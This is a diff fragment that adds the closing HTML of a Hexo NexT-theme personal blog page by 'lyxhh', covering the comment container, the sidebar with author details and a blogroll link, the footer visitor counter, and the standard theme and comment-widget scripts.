+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
